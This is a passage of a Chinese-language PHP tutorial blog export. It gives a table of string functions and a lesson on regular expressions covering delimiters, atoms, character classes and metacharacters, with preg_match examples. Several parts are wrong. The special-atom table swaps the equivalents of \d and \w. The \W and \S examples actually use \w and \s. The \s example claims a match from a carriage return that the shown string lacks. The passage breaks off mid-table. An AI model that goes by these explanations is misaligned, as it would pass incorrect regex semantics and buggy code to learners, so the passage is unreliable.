align="center">strnatcasecmp()</td><td align="left">自然顺序法比较字符串长度,不区分大小写</td><td align="left">int strnatcasecmp ( string $str1 , string $str2 )</td></tr><tr><td align="center">chunk_split()</td><td align="left">将字符串分成小块</td><td align="left">str chunk_split(str $body[,int $len[,str $end]])</td></tr><tr><td align="center">strtok()</td><td align="left">切开字符串</td><td align="left">str strtok(str $str,str $token)</td></tr><tr><td align="center">explode()</td><td align="left">使用一个字符串为标志分割另一个字符串</td><td align="left">array explode(str $sep,str $str[,int $limit])</td></tr><tr><td align="center">implode()</td><td align="left">同join,将数组值用预订字符连接成字符串</td><td align="left">string implode ( string $glue , array $pieces )</td></tr><tr><td align="center">substr()</td><td align="left">截取字符串</td><td align="left">string substr ( string $string , int $start [, int $length ] )</td></tr><tr><td align="center">str_replace()</td><td align="left">字符串替换操作,区分大小写</td><td align="left">mix str_replace(mix $search,,mix $replace,mix $subject[,int &amp;$num])</td></tr><tr><td align="center">str_ireplace()</td><td align="left">字符串替换操作,不区分大小写</td><td align="left">mix str_ireplace ( mix $search , mix $replace , mix $subject [, int &amp;$count ] )</td></tr><tr><td align="center">substr_count()</td><td align="left">统计一个字符串,在另一个字符串中出现次数</td><td align="left">int substr_count ( string $haystack , string $needle [, int $offset = 0 [, int $length ]] )</td></tr><tr><td align="center">substr_replace()</td><td align="left">替换字符串中某串为另一个字符串</td><td align="left">mixed substr_replace ( mixed $string , string $replacement , int $start [, int $length ] )</td></tr><tr><td align="center">similar_text()</td><td align="left">返回两字符串相同字符的数量</td><td align="left">int similar_text(str $str1,str $str2)</td></tr><tr><td align="center">strchr()</td><td align="left">返回一个字符串在另一个字符串中开始位置到结束的字符串</td><td align="left">string strstr ( string $str, string $needle , bool $before_needle )</td></tr><tr><td align="center">strrchr()</td><td align="left">返回一个字符串在另一个字符串中最后一次出现位置开始到末尾的字符串</td><td align="left">string strrchr ( string $haystack , mixed $needle )</td></tr><tr><td align="center">stristr()</td><td align="left">返回一个字符串在另一个字符串中开始位置到结束的字符串，不区分大小写</td><td align="left">string stristr ( string $haystack , mixed $needle [, bool $before_needle = false ] )</td></tr><tr><td align="center">strtr()</td><td align="left">转换字符串中的某些字符</td><td align="left">string strtr ( string $str , string $from , string $to )</td></tr><tr><td align="center">strpos()</td><td align="left">寻找字符串中某字符最先出现的位置</td><td align="left">int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</td></tr><tr><td align="center">stripos()</td><td align="left">寻找字符串中某字符最先出现的位置,不区分大小写</td><td align="left">int stripos ( string $haystack , string $needle [, int $offset ] )</td></tr><tr><td align="center">strrpos()</td><td align="left">寻找某字符串中某字符最后出现的位置</td><td align="left">int strrpos ( string $haystack , string $needle [, int $offset = 0 ] )</td></tr><tr><td align="center">strripos()</td><td align="left">寻找某字符串中某字符最后出现的位置,不区分大小写</td><td align="left">int strripos ( string $haystack , string $needle [, int $offset ] )</td></tr><tr><td align="center">strspn()</td><td align="left">返回字符串中首次符合mask的子字符串长度</td><td align="left">int strspn ( string $str1 , string $str2 [, int $start [, int $length ]] )</td></tr><tr><td align="center">strcspn()</td><td align="left">返回字符串中不符合mask的字符串的长度</td><td align="left">int strcspn ( string $str1 , string $str2 [, int $start [, int $length ]] )</td></tr><tr><td align="center">str_word_count()</td><td align="left">统计字符串含有的单词数</td><td align="left">mix str_word_count(str $str,[])</td></tr><tr><td align="center">strlen()</td><td align="left">统计字符串长度</td><td align="left">int strlen(str $str)</td></tr><tr><td align="center">count_chars()</td><td align="left">统计字符串中所有字母出现次数(0..255)</td><td align="left">mixed count_chars ( string $string [, int $mode ] )</td></tr><tr><td align="center">md5()</td><td align="left">字符串md5编码</td><td align="left">$str = “Hello”; echo md5($str)</td></tr><tr><td align="center"><font color="red"><strong>iconv：</strong></font></td><td align="left"></td><td align="left"></td></tr><tr><td align="center">mb_substr</td><td align="left">获取字符串的部分</td><td align="left">string mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] )</td></tr><tr><td align="center">mb_http_output</td><td align="left">设置/获取 HTTP 输出字符编码</td><td align="left">mixed mb_http_output ([ string $encoding = mb_http_output() ] )</td></tr><tr><td align="center">mb_strlen</td><td align="left">获取字符串的长度</td><td align="left">mixed mb_strlen ( string $str [, string $encoding = mb_internal_encoding() ] )</td></tr><tr><td align="center">iconv</td><td align="left">字符串按要求的字符编码来转换</td><td align="left">string iconv ( string $in_charset , string $out_charset , string $str )</td></tr><tr><td align="center">iconv_substr</td><td align="left">截取字符串的部分</td><td align="left"></td></tr><tr><td align="center">iconv_get_encoding</td><td align="left">获取 iconv 扩展的内部配置变量</td><td align="left"></td></tr><tr><td align="center">mb_substr_count</td><td align="left">统计字符串出现的次数</td><td align="left"></td></tr><tr><td align="center">mb_check_encoding</td><td align="left">检查字符串在指定的编码里是否有效</td><td align="left"></td></tr><tr><td align="center">mb_strrpos</td><td align="left">查找字符串在一个字符串中最后出现的位置</td><td align="left"></td></tr><tr><td align="center">mb_split</td><td align="left">使用正则表达式分割多字节字符串</td><td align="left"></td></tr><tr><td align="center">parse_url</td><td align="left">解释URL成为一个数组</td><td align="left"></td></tr></tbody></table></div></div>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-正则表达式</title>
      <link href="/post/PHP-Regular-Expression/"/>
      <url>/post/PHP-Regular-Expression/</url>
      
        <content type="html"><![CDATA[<p>世界上最难懂的是道士的鬼符、医生的处方和程序员的正则表达示。(ง •_•)ง</p><a id="more"></a><p>&ensp;<br>&ensp;</p><center><font color="#00B2EE" face="Comic sans MS" size="5">PHP 正则表达式</font></center><p>&emsp;<br>&emsp;</p><p><font color="red"><strong>正则表达示我们其实之前经常看到，它主要用在以下一些地方：</strong></font><br>1.匹配邮箱、手机号码、验证码<br>2.替换敏感的关键词。例如：涉及政治和骂人的话<br>3.文章采集。<br>4.早期的表情替换技术,ubb文件编码、markdown编辑器替换等<br>5.以后自己写模板引擎也需要用到正则表达示<br>其他….<br><font face="Comic sans MS"></font></p><blockquote><p>正则表达式是一种描述字符串结果的语法规则，是一个特定的格式化模式，可以匹配、替换、截取匹配的字符串。<font color="#00B2EE"><strong>常用的语言基本上都有正则表达式，如JavaScript、java</strong></font>等。其实，只有了解一种语言的正则使用，其他语言的正则使用起来，就相对简单些。文本主要围绕解决下面问题展开。</p></blockquote><hr><hr><h4 id="1-定界符"><font color="#FF6347" face="Comic sans MS">1. 定界符</font><a href="post/PHP-Regular-Expression#1-定界符"></a></h4><p><font face="Comic sans MS">定界符，就是定一个边界，边界以内的就是正则表达示。<br>PHP的正则表达示定界符的规定如下：<br>定界符，<font color="#00B2EE"><strong>不能用a-zA-Z0-9\ 其他的都可以用。必须成对出现，有开始就有结束。</strong></font><br>我们来例几个例子：<br></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">例子</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/中间写正则/</td><td align="center">正确</td></tr><tr><td align="center">$中间写正则$</td><td align="center">正确</td></tr><tr><td align="center">%中间写正则%</td><td align="center">正确</td></tr><tr><td align="center">^中间写正则^</td><td align="center">正确</td></tr><tr><td align="center">@中间写正则@</td><td align="center">正确</td></tr><tr><td align="center">#中间写正则#</td><td align="center">正确</td></tr><tr><td align="center">(中间写正则)</td><td align="center">错误</td></tr><tr><td align="center">A中间写正则A</td><td align="center">错误</td></tr></tbody></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="2-转义字符"><font face="Comic sans MS" color="#FF6347"> 2. 转义字符 </font><a href="post/PHP-Regular-Expression#2-转义字符"></a></h4><p><font face="Comic sans MS">注：<font color="#FF7F00">\ </font>是转义字符，如果在以后正则表达示里面需要匹配/，如下：<br>/ / /<br>这个时候真要匹配/ 的时候，需要把定界符里面的/ 用转义字符转义一下，写成下面的例子：<br>/ <font color="#FF7F00">&lt;/font&gt;/ /<br>如果你觉得麻烦，遇到这种需要转义的字符的时候可以把两个正斜线（/ /）定界，改为其他的定界符（# #）。<br></font></font></p><p>&emsp;<br>&emsp;</p><h4 id="3-原子"><font face="Comic sans MS"><font color="#FF6347"> 3. 原子 </font></font><a href="post/PHP-Regular-Expression#3-原子"></a></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>原子</strong></font>是正则表达示里面的最小单位，原子说白了就是需要匹配的内容。一个成立的正则表达示当中必须最少要有一个原子。<br><font color="#00B2EE"><strong>所有可见不可见的字符就是原子！</strong></font><br><font color="red"><strong>说明：</strong></font>我们见到的空格、回车、换行、0-9、A-Za-z、中文、标点符号、特殊符号全为原子。<br>在做原子的实例前我们先来讲解一个函数,preg_match:<br><font color="red">int preg_match ( string $正则 , string $字符串 [, array &amp;$结果] )</font><br>功能：根据$正则变量，匹配$字符串变量。如果存在则返回匹配的个数，把匹配到的结果放到$结果变量里。如果没有匹配到结果返回0。<br><strong>注：</strong>上面是preg_match常用的主要几个参数。我在上面将另外几个参数没有列出来。因为，另外两个参数太不常用了。<br>我们来通过实验来证明：<br></font></p><p><font color="#FF6347">(1)↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//定义一个变量叫zz，放正则表达示。为了方便大家记忆，如果你英文比较ok，建议把变量名还是写成//英文的<span class="token variable">$pattern</span>。<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/a/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'ddfdjjvi2jfvkwkfi24'</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>因为我希望的是匹配a，而$string当是是不存在a的，所以不成功。</p></blockquote><p><font color="#FF6347">(2)↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/wq/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'ssssswqaaaaaa'</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>上面的字符串中s后存在wq，因此匹配成功。</p></blockquote><p>接下来我们匹配一个空格试试：<br><font color="#FF6347">(3)↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/ /'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'sssssw aaaaa'</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配到了，结果为：array<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token string">" "</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>因上，$string这个变量的w字符后存在一个空格。所以匹配成功，输出了字符串类型，长度为1。只不过我们的肉眼不可见，看不到这个字符串而已。</p></blockquote><p>&emsp;</p><h4 id="4-特殊标识的原子"><font face="Comic sans MS" color="#FF6347">4. 特殊标识的原子</font><a href="post/PHP-Regular-Expression#4-特殊标识的原子"></a></h4><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">原子</th><th align="left">说明</th><th align="left">等价式</th></tr></thead><tbody><tr><td align="center">\d</td><td align="left">匹配一个0-9</td><td align="left">[a-zA-Z0-9_]</td></tr><tr><td align="center">\D</td><td align="left">除了0-9以外的所有字符</td><td align="left">[^a-zA-Z0-9_]</td></tr><tr><td align="center">\w</td><td align="left">a-zA-Z0-9_</td><td align="left">[0-9]</td></tr><tr><td align="center">\W</td><td align="left">除了0-9A-Za-z_以外的所有字符</td><td align="left">[^0-9]</td></tr><tr><td align="center">\s</td><td align="left">匹配所有空白字符\n \t \r 空格</td><td align="left">[ \t\n\f\r]</td></tr><tr><td align="center">\S</td><td align="left">匹配所有非空白字符</td><td align="left">[^ \t\n\f\r]</td></tr><tr><td align="center">[ ]</td><td align="left">指定范围的原子</td><td align="left"></td></tr></tbody></table></div></div><p><font color="#FF6347">这个个需要记住，最好达到默写级别。记忆的时候成对记忆，\d是匹配一个0-9，那么\D 就是除了0-9以外的所有字符。上面已经说明的很清楚了，我们进行实验一步一步对这些进行学习。</font></p><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. \d匹配一个0-9</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/\d/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'我爱喝9你爱不爱喝'</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. \D匹配一个非0-9的值</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/\D/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'121243中23453453'</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配成功，匹配到了中。因为它不是0-9之间的字符。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. \w匹配一个a-zA-Z0-9_</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/\w/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'新中_国万岁呀万岁'</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配成功，匹配到了下划线。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. \W匹配一个非a-zA-Z0-9_</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/\w/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'afasABCWEQR44231284737'</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配失败。因为，上面上面全是a-zA-Z0-9_，没有非a-zA-Z0-9_。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. \s 匹配所有空白字符\n \t \r 空格</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/\s/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"中国万岁"</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配成功，因为有一个回车。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. \S 非空字符</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/\s/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"                 a       "</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配成功。虽然上面有空格，回车和缩进。但是，有一个非空白字符a。因此，匹配成功。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. [] 指定范围的原子</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/[0-5]\w+/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'6a'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">'1C'</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结论：<br>上例中0-5匹配$string失败，而$string1成功。因为，$string中的第一个数值为6，不在[0-5]的范围之内。</p></blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/[a-zA-Z0-9_]\w/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'ab'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">'9A'</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结论：$string和$string1都匹配成功。因为\w就是[a-zA-Z0-9_]</p></blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/[abc]\d+/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'a9'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">'b1'</span><span class="token punctuation">;</span><span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">'c5'</span><span class="token punctuation">;</span><span class="token variable">$string3</span> <span class="token operator">=</span> <span class="token string">'d4'</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结论：$string、$string1、$string2匹配成功，而$string3不成功。因为$string3超过了[abc]的范围，它是从d开始的。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. [^ 字符] 不匹配指定区间的字符</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/[^0-9A-Za-z_]/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'aaaaab311dd'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">'!<span class="token variable">$@!#</span>%<span class="token variable">$#</span>^##'</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结论：</p><ol><li>匹配$string不成功，但是匹配$string1的时候成功。因为中括号里面有个抑扬符。</li><li>^ 抑扬符在中括号里面的作用是不准以中括号里面的字符进行匹配。</li></ol></blockquote><p>&emsp;</p><h4 id="5-元字符"><font face="Comic sans MS" color="#FF6347">5. 元字符</font><a href="post/PHP-Regular-Expression#5-元字符"></a></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>抛出问题：</strong></font>\d 代表匹配一个字符。而我现在想要匹配十个八个，任意多个数字肿么办？<br>这个时候我们就要用到元字符。在使用原子的时候，发现只能够匹配一个字符，可是要匹配多个字符就出现了问题。<br>这个时候，我们需要借助<font color="#00B2EE">元字符</font>来帮我们修饰原子，实现更多的功能。<br></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">元字符</th><th align="left">功能说明</th></tr></thead><tbody><tr><td align="center">*</td><td align="left">是代表匹配前面的一个原子，匹配0次或者任意多次前面的字符。</td></tr><tr><td align="center">+</td><td align="left">匹配一次或多前前面的一个字符</td></tr><tr><td align="center">?</td><td align="left">前面的字符可有可无【可选】 有或没有</td></tr><tr><td align="center">.</td><td align="left">更标准一些应该把点算作原子。匹配除了\n以外的所有字符</td></tr><tr><td align="center">丨</td><td align="left">或者。注：它的优先级最低了。</td></tr><tr><td align="center">^</td><td align="left">必须要以抑扬符之后的字符串开始</td></tr><tr><td align="center">$</td><td align="left">必须要以$之前的字符结尾</td></tr><tr><td align="center">\b</td><td align="left">词边界</td></tr><tr><td align="center">\B</td><td align="left">非边界</td></tr><tr><td align="center">{m}</td><td align="left">有且只能出现m次</td></tr><tr><td align="center">{n,m}</td><td align="left">可以出现n到m次</td></tr><tr><td align="center">{m,}</td><td 